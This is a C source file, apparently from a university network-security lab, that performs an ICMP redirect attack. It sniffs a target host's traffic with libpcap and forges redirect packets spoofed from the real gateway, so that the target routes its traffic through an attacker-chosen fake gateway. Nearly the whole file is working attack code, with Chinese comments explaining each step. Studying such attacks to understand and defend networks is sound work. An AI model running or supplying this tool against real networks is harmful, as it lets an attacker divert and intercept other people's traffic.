/*
 * =====================================================================================
 *
 *       Filename:  icmpReditect.c
 *
 *    Description:  Performance a IMCP-Redirect Attack for fixed Device
 *                  Input args should be the given device ip and gateway
 *
 *        Version:  1.0
 *        Created:  2015年06月07日 21时02分30秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  ExiaHan
 *   Organization:  USTC
 *
 * =====================================================================================
 */

#include "lab.h"


int main(int argc, char **argv)
{
    char *cDev, cErrBuf[PCAP_ERRBUF_SIZE];
    BPFP scBpfp;
    char cFilterExp[100];
    bpfu32 uMask,uNet;
    ppthdr scPpHeader;
    ppt *pHandle;
    const uchar *packet;
    char *gw[2];

    if (argc != 5) {
        printf("[I]: Usage %s Interface TargetIP GateWay FakeGateWay\n", argv[0]);
        return 0;
    }

    cDev = argv[1];
    printf("[I]: Use Interface %s\n", cDev);

    sprintf(cFilterExp, "src net %s", argv[2]);
    printf("[I]: Filter Expression: %s\n", cFilterExp);

    gw[0] = argv[3];

    gw[1] = argv[4];
    printf("[I]: FakeGateWay will use: %s\n", gw[1]);

    if (pcap_lookupnet(cDev, &uNet, &uMask, cErrBuf) == -1) {//查找网络
        printf("[E]： Error when lookup net, info:[%s]\n", cErrBuf);
        return -2;
    }
        
    if (!(pHandle = pcap_open_live(cDev, BUFSIZ, 1, 0, cErrBuf))){//打开设备准备监听
        printf("[E]: Error when pcap_open_live, info: [%s]\n", cErrBuf);
        return -3;
    }

    if (pcap_compile(pHandle, &scBpfp, cFilterExp, 0, uNet) == -1) {//解析过滤规则
        printf("[E]: Error when parse filter [%s], info: [%s]\n", cFilterExp, pcap_geterr(pHandle));
        return -4;
    }

    if (pcap_setfilter(pHandle, &scBpfp) == -1){//设置过滤器
        printf("[E]: Error when install filter [%s], info: [%s]\n", cFilterExp, pcap_geterr(pHandle));
        return -5;
    }

        pcap_loop(pHandle, LOOPREAD, attackHost, (uchar *)gw);
            
        pcap_freecode(&scBpfp);
        pcap_close(pHandle);

    return 0;
}

void attackHost(uchar *args, const ppthdr  *header, const uchar *packet)
{
    int sockfd, i;
    int ipLength, icmpDataLength;
    SockAddrIn scTarget;
    unsigned short checksum;
    char **gw = (char **)args;//gw[0] is gateway, gw[1] is fakegateway
    IP *pscIp = (IP *)(packet + ETHER_SIZE);
    ipLength = HEADERLEN + pscIp->ip_hl * 4 + 36;//头部并不一定都是20,再加上icmp的8字节头，20字节ipHeader，8字节ip数据
    u1 *uPacketRaw = (u1 *)malloc(sizeof(u1) * ipLength);
    IP *pscAttack = (IP *)uPacketRaw;
    ICMP *pscAttackIcmp = (ICMP *)(uPacketRaw + HEADERLEN);


    bzero(uPacketRaw, ipLength);
    //for test
    //printf("[In CallBack]: FateGakeWay---%s\n", gw[1]);
    //printf("[In CallBack]: length of IP struct %d\n", sizeof(IP));


    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW) == -1)) {
        printf("[I]: Error when create socket\n");
        return;
    }

    //初始化sockaddr_in结构体，发送时要用
    scTarget.sin_family = AF_INET;
    
    //for test
    //printf("[In CallBack]: src_ip %s\n", inet_ntoa(pscIp->ip_src));
    inet_aton(inet_ntoa(pscIp->ip_src), &(scTarget.sin_addr));
    scTarget.sin_port = htons(0);
    bzero(&(scTarget.sin_zero), sizeof(scTarget.sin_zero));

    /*raw sock 不用bind吧。。猜的。根本没用端口 绑个毛。
    if (bind(sockfd, (SockAddr *)(&scTarget), sizeof(scTarget)) == -1) {
        printf("[I]: Error when bind socket\n");
        return;
    }*/

    pscAttack->ip_v = 4;
    pscAttack->ip_hl = 5;
    pscAttack->ip_tos = 0;
    pscAttack->ip_len = htons(TOTALLEN);
    pscAttack->ip_off = 0;
    pscAttack->ip_ttl = 16;
    pscAttack->ip_p = IPPROTO_ICMP;
    
    //填入真实网关地址，因为必须是网关发的才有效
    inet_aton(gw[0], &(pscAttack->ip_src));
    //填入目的地址，即被攻击设备，因为抓的包都是过滤到它的，所以直接把抓包的src地址拿来就好
    inet_aton(inet_ntoa(pscIp->ip_src), &(pscAttack->ip_dst));
    

    //ip头组装完成，开始玩icmp，校验码都最后算。
    pscAttackIcmp->icmp_type = ICMP_REDIRECT;
    pscAttackIcmp->icmp_code = 1;
    //填入fake gateway
    inet_aton(gw[1], &(pscAttackIcmp->icmp_gwaddr));
    //拷贝数据
    icmpDataLength = pscIp->ip_hl * 4 + 8;
    copyByByte((u1 *)pscIp, (u1 *)pscAttackIcmp + 8, icmpDataLength);
    
    i = 0;//发5个
    while (i < 5) {
        //计算校验和,IP,ICMP，每次计算前按照计算要求先让校验值是0，否则会出现一个对一个错的情况
        pscAttack->ip_id = i;
        pscAttack->ip_sum = 0;
        pscAttackIcmp->icmp_cksum = 0;
        checksum = in_cksum((unsigned short *)pscAttack, HEADERLEN);
        pscAttack->ip_sum = checksum; 
        checksum = in_cksum((unsigned short *)pscAttackIcmp, icmpDataLength + 8);
        pscAttackIcmp->icmp_cksum = checksum;
        
        //发送
        sendto(sockfd, uPacketRaw, ipLength, 0, (SockAddr *)(&scTarget), sizeof(scTarget));

        i++;
    }
    close(sockfd);

    return;
}

//网上来的，我也没细看，反正算的是对的
unsigned short in_cksum(unsigned short *addr, int len) 
{
    int sum=0;
    unsigned short res=0;
    while (len > 1)  { 
        sum += *addr++;
        len -=2;
     }
    if (len == 1) {
        *((unsigned char *)(&res))=*((unsigned char *)addr);
        sum += res;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    res = ~sum;
    return res; 
}


//数据拷贝小函数
void copyByByte(u1 *s, u1 *d, int len)
{
    int i = 0;
    while (i < len ) {
        *(d + i) = *(s + i);
        i++;
    }
    return;
}
